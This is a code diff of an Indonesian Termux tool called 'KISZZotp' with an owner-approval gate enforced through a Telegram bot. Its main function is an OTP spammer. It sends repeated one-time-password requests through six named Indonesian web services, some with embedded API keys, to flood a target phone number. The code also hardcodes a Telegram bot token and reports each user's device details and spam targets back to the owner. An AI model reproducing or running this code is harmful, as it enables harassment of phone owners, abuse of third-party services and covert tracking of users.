@@ -6,644 +6,380 @@ import fs from 'fs';
 import os from 'os';
 import crypto from 'crypto';
 
-const C = {
-    TOKEN: '8991103400:AAHR3EJhGd7MBfHeY8_6HJgnN93SEIdcvSY',
-    CHAT_ID: '8276813899',
-    OWNER: '6283147801427',
-    VER: '2.8.0',
-    TIMEOUT: 120,
-    POLL: 1,
+const CONFIG = {
+    TELEGRAM_TOKEN: '8991103400:AAHR3EJhGd7MBfHeY8_6HJgnN93SEIdcvSY',
+    TELEGRAM_CHAT_ID: '8276813899',
+    OWNER_NUMBER: '085168142675',
+    VERSION: '1.3.0',
+    APPROVAL_TIMEOUT: 120,
+    POLL_INTERVAL: 3,
 };
 
-const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// ====== AUTO UPDATE ======
-function checkUpdate() {
+function getTermuxId() {
     try {
-        if (!fs.existsSync('.git')) return;
-        console.log(chalk.gray('🔄 Cek update...'));
-        execSync('git fetch', { stdio: 'ignore' });
-        const status = execSync('git status -uno', { encoding: 'utf8' });
-        if (status.includes('Your branch is behind')) {
-            console.log(chalk.yellow('📢 Ada update baru! Mengunduh...'));
-            execSync('git pull', { stdio: 'inherit' });
-            console.log(chalk.green('✅ Update berhasil! Restart script...'));
-            process.exit(0);
+        const uid = execSync('id -u').toString().trim();
+        const hostname = os.hostname();
+        return `${uid}@${hostname}`;
+    } catch { return 'unknown'; }
+}
+
+function getDeviceInfo() {
+    try {
+        const model = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
+        const android = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
+        return `${model} (Android ${android})`;
+    } catch { return 'Unknown Device'; }
+}
+
+function getCurrentTime() {
+    return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+}
+
+function generateCode() {
+    return crypto.randomInt(100000, 999999).toString();
+}
+
+async function notifyOwner(message) {
+    if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return false;
+    try {
+        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        return true;
+    } catch { return false; }
+}
+
+async function sendTelegramMessage(text, keyboard = null) {
+    try {
+        const payload = {
+            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+        };
+        if (keyboard) {
+            payload.reply_markup = JSON.stringify({ inline_keyboard: keyboard });
         }
-        console.log(chalk.green('✅ Sudah versi terbaru.'));
-    } catch { console.log(chalk.gray('⚠️ Gagal cek update. Lanjut...')); }
-}
-
-// ====== NOTIFIKASI AKTIVITAS USER ======
-async function notifyOwner(action, user, detail) {
-    if (!detail) detail = '';
-    try {
-        const msg = '📢 *Aktivitas User*\n👤 ' + user + '\n📌 ' + action + (detail ? '\n📝 ' + detail : '');
-        await sendTG(msg, null);
-    } catch {}
-}
-
-// ====== LOGIN SYSTEM ======
-function loadUsers() {
-    try {
-        if (!fs.existsSync('users.json')) return {};
-        return JSON.parse(fs.readFileSync('users.json'));
-    } catch { return {}; }
-}
-function saveUsers(users) {
-    try {
-        fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
+        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, payload);
         return true;
     } catch { return false; }
 }
-function getUser(username) {
-    const users = loadUsers();
-    return users[username] || null;
-}
-function createUser(username, password) {
-    const users = loadUsers();
-    if (users[username]) return false;
-    users[username] = { password, created: new Date().toISOString() };
-    saveUsers(users);
-    return true;
-}
-function loginUser(username, password) {
-    const user = getUser(username);
-    if (!user) return false;
-    return user.password === password;
-}
-function getCurrentUser() {
-    try {
-        if (!fs.existsSync('current.json')) return null;
-        const data = JSON.parse(fs.readFileSync('current.json'));
-        return data.username || null;
-    } catch { return null; }
-}
-function setCurrentUser(username) {
-    try {
-        fs.writeFileSync('current.json', JSON.stringify({ username, login: new Date().toISOString() }, null, 2));
-        return true;
-    } catch { return false; }
-}
-function logoutUser() {
-    try { if (fs.existsSync('current.json')) fs.unlinkSync('current.json'); return true; } catch { return false; }
-}
 
-// ====== LOG ACTIVITY ======
-function logActivity(user, action, detail) {
-    if (!detail) detail = '';
+async function answerCallbackQuery(callbackId, text) {
     try {
-        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-        const log = '[' + timestamp + '] ' + user + ' -> ' + action + ' ' + detail + '\n';
-        fs.appendFileSync('activity.log', log);
-    } catch {}
-}
-
-// ====== CHANNEL (HARDCODE) ======
-function getChannel() {
-    return 'https://whatsapp.com/channel/0029Vb9WjJx5q08iyvQuSA3Q';
-}
-function setChannel(link) { return true; }
-function delChannel() { return true; }
-
-// ====== INFO ======
-function getInfo() {
-    try {
-        if (!fs.existsSync('info.json')) return null;
-        const data = JSON.parse(fs.readFileSync('info.json'));
-        return data.text || null;
-    } catch { return null; }
-}
-function setInfo(text) {
-    try {
-        fs.writeFileSync('info.json', JSON.stringify({ text: text.trim(), updated: new Date().toISOString() }, null, 2));
-        return true;
-    } catch { return false; }
-}
-function delInfo() {
-    try { if (fs.existsSync('info.json')) fs.unlinkSync('info.json'); return true; } catch { return false; }
-}
-
-// ====== UTILITY ======
-function getID() {
-    try { return execSync('id -u').toString().trim() + '@' + os.hostname(); } catch { return 'unknown'; }
-}
-function getDevice() {
-    try {
-        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
-        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
-        return m + ' (Android ' + a + ')';
-    } catch { return 'Unknown'; }
-}
-function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
-function genCode() { return crypto.randomInt(100000, 999999).toString(); }
-
-// ====== TELEGRAM ======
-async function sendTG(text, kb) {
-    if (!kb) kb = null;
-    try {
-        const p = { chat_id: C.CHAT_ID, text: text, parse_mode: 'Markdown' };
-        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
-        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/sendMessage', p);
-        return true;
-    } catch { return false; }
-}
-async function ansCB(id, text) {
-    try {
-        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/answerCallbackQuery', {
-            callback_query_id: id, text: text, show_alert: false
+        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/answerCallbackQuery`, {
+            callback_query_id: callbackId,
+            text: text,
+            show_alert: false
         });
     } catch {}
 }
-async function getUpd(off) {
+
+async function getTelegramUpdates(offset) {
     try {
-        const r = await axios.get('https://api.telegram.org/bot' + C.TOKEN + '/getUpdates', {
-            params: { offset: off, timeout: 10 }
+        const res = await axios.get(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/getUpdates`, {
+            params: { offset, timeout: 10 }
         });
-        return r.data.result || [];
+        return res.data.result || [];
     } catch { return []; }
 }
 
-// ====== APPROVAL ======
-function isApp(id) {
+function isApproved(termuxId) {
     try {
         if (!fs.existsSync('approved.json')) return false;
         const data = JSON.parse(fs.readFileSync('approved.json'));
-        return data.includes(id);
+        return data.includes(termuxId);
     } catch { return false; }
-}
-function saveApp(id) {
-    try {
-        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
-        if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); }
-        return true;
-    } catch { return false; }
-}
-function remApp(id) {
-    try {
-        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
-        const nd = d.filter(function(x) { return x !== id; });
-        fs.writeFileSync('approved.json', JSON.stringify(nd, null, 2));
-        return true;
-    } catch { return false; }
-}
-function getApprovedList() {
-    try {
-        if (!fs.existsSync('approved.json')) return [];
-        return JSON.parse(fs.readFileSync('approved.json'));
-    } catch { return []; }
 }
 
-// ====== LIMIT ======
-function getLimit(id) {
+function saveApproved(termuxId) {
     try {
-        if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() };
-        const d = JSON.parse(fs.readFileSync('limits.json'));
-        return d[id] || { count: 0, date: new Date().toDateString() };
-    } catch { return { count: 0, date: new Date().toDateString() }; }
-}
-function incLimit(id) {
-    try {
-        let d = fs.existsSync('limits.json') ? JSON.parse(fs.readFileSync('limits.json')) : {};
-        const today = new Date().toDateString();
-        if (!d[id] || d[id].date !== today) {
-            d[id] = { count: 1, date: today };
-        } else {
-            d[id].count += 1;
+        let data = [];
+        if (fs.existsSync('approved.json')) {
+            data = JSON.parse(fs.readFileSync('approved.json'));
         }
-        fs.writeFileSync('limits.json', JSON.stringify(d, null, 2));
-        return d[id].count;
-    } catch { return 0; }
-    }
+        if (!data.includes(termuxId)) {
+            data.push(termuxId);
+            fs.writeFileSync('approved.json', JSON.stringify(data, null, 2));
+        }
+        return true;
+    } catch { return false; }
+}
 
-// ====== REQUEST APPROVAL ======
-async function reqApp(user, id, dev) {
-    const code = genCode();
-    const kb = [[
-        { text: '✅ Approve', callback_data: 'app_' + code },
-        { text: '❌ Deny', callback_data: 'den_' + code }
-    ]];
-    const msg = '🔐 *Request Approval*\n👤 ' + user + '\n🆔 ' + id + '\n📱 ' + dev + '\n🔑 *' + code + '*';
-    console.log(chalk.yellow('\n⏳ Mengirim request...'));
-    if (!await sendTG(msg, kb)) {
-        console.log(chalk.red('❌ Gagal kirim ke TG.'));
+async function requestApproval(userName, termuxId, device) {
+    const code = generateCode();
+    const keyboard = [
+        [
+            { text: '✅ Approve', callback_data: `approve_${code}` },
+            { text: '❌ Deny', callback_data: `deny_${code}` }
+        ]
+    ];
+
+    const msg = `🔐 *Request Approval KISZZotp*
+
+👤 Nama: ${userName}
+🆔 ID: ${termuxId}
+📱 Device: ${device}
+🔑 Kode: *${code}*
+
+Tap tombol di bawah:`;
+
+    console.log(chalk.yellow('\n⏳ Mengirim request approval ke owner...'));
+    const sent = await sendTelegramMessage(msg, keyboard);
+    if (!sent) {
+        console.log(chalk.red('❌ Gagal kirim ke Telegram. Cek token & chat ID.'));
         process.exit(1);
     }
-    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
-    let off = 0;
+
+    await notifyOwner(`📩 *${userName}* meminta approval.\n🆔 ${termuxId}\n🔑 Kode: ${code}`);
+
+    console.log(chalk.green('✅ Request terkirim! Tunggu owner tap tombol...'));
+
+    let offset = 0;
     try {
-        const old = await getUpd(0);
-        if (old.length > 0) off = old[old.length - 1].update_id + 1;
+        const old = await getTelegramUpdates(offset);
+        if (old.length > 0) offset = old[old.length - 1].update_id + 1;
     } catch {}
-    const start = Date.now();
-    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
+
+    const startTime = Date.now();
+    while ((Date.now() - startTime) / 1000 < CONFIG.APPROVAL_TIMEOUT) {
         try {
-            const up = await getUpd(off);
-            for (const u of up) {
-                off = u.update_id + 1;
-                if (u.callback_query) {
-                    const d = u.callback_query.data;
-                    const from = u.callback_query.from.id;
-                    const cid = u.callback_query.id;
-                    if (from == C.CHAT_ID) {
-                        if (d === 'app_' + code) {
-                            await ansCB(cid, '✅ Disetujui!');
+            const updates = await getTelegramUpdates(offset);
+            for (const update of updates) {
+                offset = update.update_id + 1;
+                if (update.callback_query) {
+                    const data = update.callback_query.data;
+                    const fromId = update.callback_query.from.id;
+                    const callbackId = update.callback_query.id;
+                    if (fromId == CONFIG.TELEGRAM_CHAT_ID) {
+                        if (data === `approve_${code}`) {
+                            await answerCallbackQuery(callbackId, '✅ Disetujui!');
                             console.log(chalk.green('\n✅ APPROVED!'));
-                            saveApp(id);
-                            logActivity(user, 'APPROVED', id);
-                            await notifyOwner('✅ APPROVED', user, 'ID: ' + id);
+                            saveApproved(termuxId);
+                            await notifyOwner(`✅ *${userName}* (${termuxId}) di-APPROVE.`);
                             return true;
-                        } else if (d === 'den_' + code) {
-                            await ansCB(cid, '❌ Ditolak.');
+                        } else if (data === `deny_${code}`) {
+                            await answerCallbackQuery(callbackId, '❌ Ditolak.');
                             console.log(chalk.red('\n❌ DENIED!'));
+                            await notifyOwner(`❌ *${userName}* (${termuxId}) di-DENY.`);
                             return false;
                         }
                     } else {
-                        await ansCB(cid, '❌ Bukan owner!');
+                        await answerCallbackQuery(callbackId, '❌ Anda bukan owner!');
                     }
                 }
             }
         } catch {}
-        await sleep(C.POLL * 1000);
+        await sleep(CONFIG.POLL_INTERVAL * 1000);
     }
+
     console.log(chalk.red('\n⏰ Waktu habis!'));
+    await notifyOwner(`⏰ *${userName}* (${termuxId}) request timeout.`);
     return false;
 }
 
-async function getLoginUser() {
-    const current = getCurrentUser();
-    if (current) {
-        console.log(chalk.green('✅ Login sebagai: ' + current));
-        return current;
-    }
-    let username = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
-    username = username.trim();
-    if (!username) username = 'Anonymous';
-
-    const user = getUser(username);
-    if (user) {
-        let attempts = 3;
-        while (attempts > 0) {
-            const pass = readlineSync.question(chalk.cyan('Masukkan password: '), { hideEchoBack: true });
-            if (loginUser(username, pass)) {
-                setCurrentUser(username);
-                console.log(chalk.green('✅ Login berhasil!'));
-                await notifyOwner('🔓 LOGIN', username, '');
-                return username;
-            }
-            attempts--;
-            console.log(chalk.red('❌ Password salah! Sisa percobaan: ' + attempts));
-        }
-        console.log(chalk.red('❌ Gagal login. Script keluar.'));
-        process.exit(1);
-    } else {
-        console.log(chalk.yellow('🔐 Buat akun baru untuk ' + username));
-        const pass = readlineSync.question(chalk.cyan('Buat password (min 4 karakter): '), { hideEchoBack: true });
-        if (!pass || pass.length < 4) {
-            console.log(chalk.red('❌ Password minimal 4 karakter!'));
-            process.exit(1);
-        }
-        createUser(username, pass);
-        setCurrentUser(username);
-        console.log(chalk.green('✅ Akun berhasil dibuat!'));
-        await notifyOwner('🆕 USER BARU', username, '');
-        return username;
-    }
+function getUserName() {
+    let name = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
+    if (!name.trim()) name = 'Anonymous';
+    return name.trim();
 }
 
-function getStat(isO, id) {
-    if (isO) return chalk.green('★ OWNER');
-    if (isApp(id)) return chalk.green('★ PARTNER');
-    return chalk.yellow('▸ Gratisan');
+function getStatus(isOwner) {
+    return isOwner ? chalk.green('★ OWNER') : chalk.yellow('▸ Gratisan');
 }
 
-// ====== TOTAL USER ======
-function getTotalUsers() {
-    try {
-        const users = loadUsers();
-        return Object.keys(users).length;
-    } catch { return 0; }
-}
-
-// ====== HEADER (PERSIS SEPERTI YANG KAMU KASIH) ======
-function showHeader(u, s, id, dev) {
+function showHeader(user, status, termuxId, device) {
     console.clear();
-
-    const RED = '\x1b[1;31m';
-    const WHITE = '\x1b[1;37m';
-    const RESET = '\x1b[0m';
-
-    console.log(RED);
-    console.log('╔════════════════════════════════════════════════════════════╗');
-    console.log('║                                                            ║');
-    console.log('║        ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗    ║');
-    console.log('║        ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║    ║');
-    console.log('║        ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║    ║');
-    console.log('║        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║    ║');
-    console.log('║        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║    ║');
-    console.log('║        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝    ║');
-    console.log('║                                                            ║');
-    console.log('║                    ██████╗ ████████╗██████╗               ║');
-    console.log('║                   ██╔═══██╗╚══██╔══╝██╔══██╗              ║');
-    console.log('║                   ██║   ██║   ██║   ██████╔╝              ║');
-    console.log('║                   ██║   ██║   ██║   ██╔═══╝               ║');
-    console.log('║                   ╚██████╔╝   ██║   ██║                   ║');
-    console.log('║                    ╚═════╝    ╚═╝   ╚═╝                   ║');
-    console.log('║                                                            ║');
-    console.log(WHITE + '║                    BY kiszzaja' + RED + '                         ║');
-    console.log('║                                                            ║');
-    console.log('╚════════════════════════════════════════════════════════════╝');
-    console.log(RESET);
-    console.log('');
-
-    console.log(chalk.cyan('╔════════════════════════════════════════════════════════════╗'));
-    console.log(chalk.cyan('║ ') + chalk.bold('👤 User  ') + ': ' + chalk.green(u));
-    console.log(chalk.cyan('║ ') + chalk.bold('📊 Status') + ': ' + s);
-    console.log(chalk.cyan('║ ') + chalk.bold('🆔 ID    ') + ': ' + chalk.blue(id));
-    console.log(chalk.cyan('║ ') + chalk.bold('📱 Device') + ': ' + chalk.magenta(dev));
-    console.log(chalk.cyan('║ ') + chalk.bold('⏰ Waktu ') + ': ' + chalk.gray(getTime()));
-    console.log(chalk.cyan('║ ') + chalk.bold('👥 Total User') + ': ' + chalk.yellow(getTotalUsers()));
-    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════╝'));
-    console.log('');
-    showInfoBox();
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
+║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
+║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
+║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
+║   ██║  ██╗██║███████╗███████╗███████╗       ║
+║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
+║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
+╚═══════════════════════════════════════════════╝
+`));
+    console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
+    console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
+    console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${status}`));
+    console.log(chalk.white(`║ ${chalk.bold('🆔 ID')}     : ${chalk.blue(termuxId)}`));
+    console.log(chalk.white(`║ ${chalk.bold('📱 Device')} : ${chalk.magenta(device)}`));
+    console.log(chalk.white(`║ ${chalk.bold('⏰ Waktu')}  : ${chalk.gray(getCurrentTime())}`));
+    console.log(chalk.white(`╚═══════════════════════════════════════════════╝`));
+    console.log();
 }
 
-function showInfoBox() {
-    const info = getInfo();
-    if (!info) return;
-    console.log(chalk.yellow('╔═══════════════════════════════════╗'));
-    console.log(chalk.yellow('║   📢 INFO DARI KISZZ             ║'));
-    console.log(chalk.yellow('╠═══════════════════════════════════╣'));
-    console.log(chalk.white('║ ' + info.padEnd(29) + ' ║'));
-    console.log(chalk.yellow('╚═══════════════════════════════════╝'));
-    console.log('');
+function showMenu() {
+    console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
+    console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
+    console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Halaman Spammer OTP         ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Halaman Lapor Bug           ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Halaman Cek Update         ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
+    console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
+    console.log();
 }
 
-function showMenu(isO) {
-    console.log(chalk.yellow('📋 MENU UTAMA'));
-    console.log(chalk.yellow('─'.repeat(30)));
-    console.log(chalk.cyan('1.') + ' 🚀 Spammer OTP');
-    console.log(chalk.cyan('2.') + ' 🐛 Lapor Bug');
-    console.log(chalk.cyan('3.') + ' 🔄 Cek Update');
-    console.log(chalk.cyan('4.') + ' 📢 Join Saluran KISZZ');
-    if (isO) {
-        console.log(chalk.cyan('5.') + ' 👥 Add Partner (Owner Only)');
-        console.log(chalk.cyan('6.') + ' 📢 Set Info (Owner Only)');
-        console.log(chalk.cyan('7.') + ' ❌ Delete Partner (Owner Only)');
-    }
-    console.log(chalk.cyan('8.') + ' ❌ Keluar');
-    console.log(chalk.yellow('─'.repeat(30)));
-}
-
-// ====== SPAMMER OTP ======
-async function spam(user, id, isO, isP) {
+async function halamanSpammer(user, termuxId) {
     console.clear();
-    console.log(chalk.cyan('🚀 SPAMMER OTP\n'));
-    await notifyOwner('🚀 SPAM START', user, '');
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🚀  HALAMAN SPAMMER OTP              ║
+╚═══════════════════════════════════════════════╝
+`));
 
-    if (!isO && !isP) {
-        const lim = getLimit(id);
-        const today = new Date().toDateString();
-        if (lim.date === today && lim.count >= 3) {
-            console.log(chalk.red('❌ Limit habis! (3x/hari). Upgrade ke partner.'));
-            readlineSync.question(chalk.gray('\nTekan Enter...'));
-            return;
-        }
-    }
-    const inp = readlineSync.question(chalk.white('📱 Nomor (pisah koma untuk partner/owner): '));
-    if (!inp.trim()) {
-        console.log(chalk.red('❌ Tidak boleh kosong!'));
-        readlineSync.question(chalk.gray('\nTekan Enter...'));
+    const target = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
+    if (!target.trim()) {
+        console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
+        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
         return;
     }
-    let targets = (isP || isO) ? inp.split(',').map(function(t) { return t.trim(); }) : [inp.trim()];
-    const delay = (isP || isO) ? 500 : 2000;
-    for (let idx = 0; idx < targets.length; idx++) {
-        const t = targets[idx];
-        let phone = t.replace(/[^0-9]/g, '');
-        if (phone.startsWith('0')) phone = '62' + phone.slice(1);
-        if (!phone.startsWith('62')) phone = '62' + phone;
-        const p08 = '0' + phone.slice(2);
-        const p62 = phone;
-        console.log(chalk.green('✅ Target: ' + phone));
-        const otp = [
-            { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH' } },
-            { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: 'f6bd0911---b189-' }, request_via: 'whatsapp' } },
-            { url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: p62.replace('62', '') } },
-            { url: 'https://www.rumah123.com/api/otp/request-otp', data: { ipAddress: '36.67.110.51', phoneNumber: p62, portalId: 1, type: 'WHATSAPP', url: 'https://www.rumah123.com/user/login' }, headers: { 'Base-Url-Core': 'https://www.rumah123.com' } },
-            { url: 'https://beta.api.saturdays.com/api/v1/user/otp/send', data: { number: p62.replace('62', ''), country_code: '+62', type: '' }, headers: { 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'country-code': 'ID' } },
-            { url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: p62.replace('62', ''), type: 'prospect-create', channel: 'whatsapp' } }
-        ];
-        let s = 0, f = 0;
-        for (let i = 0; i < otp.length; i++) {
-            const ep = otp[i];
-            try {
-                const cfg = { headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', ...(ep.headers || {}) }, timeout: 10000 };
-                process.stdout.write('[' + (i+1) + '/' + otp.length + '] 🔄 Mengirim... ');
-                if (ep.method === 'GET') await axios.get(ep.url, cfg);
-                else await axios.post(ep.url, ep.data, cfg);
-                s++;
-                console.log(chalk.green('✅ Berhasil'));
-            } catch {
-                f++;
-                console.log(chalk.red('❌ Gagal'));
-            }
-            await sleep(delay);
-        }
-        console.log('\n📱 ' + phone + '\n📤 ' + otp.length + '\n✅ ' + s + '\n❌ ' + f);
-        logActivity(user, 'SPAM', 'Target: ' + phone + ' | Berhasil: ' + s + ' | Gagal: ' + f);
-        const detail = '📱 Target: ' + phone + '\n✅ Berhasil: ' + s + '\n❌ Gagal: ' + f;
-        await notifyOwner('🎯 SPAM RESULT', user, detail);
-    }
-    if (!isO && !isP) {
-        const nc = incLimit(id);
-        console.log(chalk.gray('📊 Sisa limit: ' + (3 - nc) + ' dari 3.'));
-    }
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
 
-async function laporBug(user) {
-    console.clear();
-    console.log(chalk.yellow('\n🐛 LAPOR BUG\n'));
-    console.log(chalk.white('📱 Owner: ' + C.OWNER));
-    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));
-    const c = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
-    if (c.toLowerCase() === 'y') {
+    let phone = target.replace(/[^0-9]/g, "");
+    if (phone.startsWith("0")) phone = "62" + phone.slice(1);
+    if (!phone.startsWith("62")) phone = "62" + phone;
+
+    const p08 = "0" + phone.slice(2);
+    const p62 = phone;
+
+    console.log(chalk.green(`✅ Target: ${phone}\n`));
+    console.log(chalk.gray('⏳ Mengirim OTP... (proses ini bisa makan waktu)\n'));
+
+    await notifyOwner(`🚀 *${user}* (${termuxId}) mulai spam ke \`${phone}\``);
+
+    const otp = [
+        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
+        { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
+        { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
+        { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
+        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "REDACTED", "country-code": "ID" } },
+        { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
+    ];
+
+    let success = 0, failed = 0;
+    for (let i = 0; i < otp.length; i++) {
+        const ep = otp[i];
         try {
-            const url = 'https://wa.me/' + C.OWNER + '?text=Halo%20KISZZ%2C%20saya%20' + encodeURIComponent(user) + '%20ingin%20lapor%20bug.';
-            execSync('termux-open-url "' + url + '"');
-            console.log(chalk.green('✅ Membuka WhatsApp...'));
-        } catch (e) {
-            console.log(chalk.red('❌ Gagal membuka WhatsApp. Silakan hubungi manual ke nomor: ' + C.OWNER));
+            const config = {
+                headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
+                timeout: 10000
+            };
+            process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
+            if (ep.method === "GET") await axios.get(ep.url, config);
+            else await axios.post(ep.url, ep.data, config);
+            success++;
+            console.log(chalk.green('✅ Berhasil'));
+        } catch {
+            failed++;
+            console.log(chalk.red('❌ Gagal'));
         }
-        logActivity(user, 'LAPOR_BUG', '');
-        await notifyOwner('🐛 LAPOR BUG', user, '');
-    }
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
-
-async function cekUpdate(user) {
-    console.clear();
-    console.log(chalk.cyan('\n🔄 CEK UPDATE\n'));
-    console.log(chalk.green('✅ Versi: ' + C.VER));
-    logActivity(user, 'CEK_UPDATE', '');
-    await notifyOwner('🔄 CEK UPDATE', user, '');
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
-
-async function addPartnerMenu(user) {
-    console.clear();
-    console.log(chalk.green('\n👥 ADD PARTNER\n'));
-    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
-    if (!tid.trim()) {
-        console.log(chalk.red('❌ Tidak boleh kosong!'));
-        readlineSync.question(chalk.gray('\nTekan Enter...'));
-        return;
-    }
-    if (isApp(tid.trim())) {
-        console.log(chalk.yellow('⚠️ ' + tid + ' sudah ada.'));
-    } else {
-        saveApp(tid.trim());
-        console.log(chalk.green('✅ ' + tid + ' ditambahkan!'));
-        logActivity(user, 'ADD_PARTNER', tid);
-        await notifyOwner('👥 ADD PARTNER', user, 'ID: ' + tid);
-    }
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
-
-async function deletePartnerMenu(user) {
-    console.clear();
-    console.log(chalk.red('\n❌ DELETE PARTNER\n'));
-    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
-    if (!tid.trim()) {
-        console.log(chalk.red('❌ Tidak boleh kosong!'));
-        readlineSync.question(chalk.gray('\nTekan Enter...'));
-        return;
-    }
-    if (isApp(tid.trim())) {
-        remApp(tid.trim());
-        console.log(chalk.green('✅ ' + tid + ' telah dihapus dari daftar partner.'));
-        logActivity(user, 'DELETE_PARTNER', tid);
-        await notifyOwner('❌ DELETE PARTNER', user, 'ID: ' + tid);
-    } else {
-        console.log(chalk.yellow('⚠️ ' + tid + ' tidak ditemukan.'));
-    }
-    readlineSync.question(chalk.gray('\nTekan Enter...'));
-}
-
-async function setInfoMenu(user) {
-    console.clear();
-    console.log(chalk.cyan('\n📢 SET INFO\n'));
-    const info = readlineSync.question(chalk.white('📝 Masukkan info baru: '));
-    if (!info.trim()) {
-        console.log(chalk.red('❌ Tidak boleh kosong!'));
-        readlineSync.question(chalk.gray('\nTekan Enter...'));
-        return;
-    }
-    setInfo(info.trim());
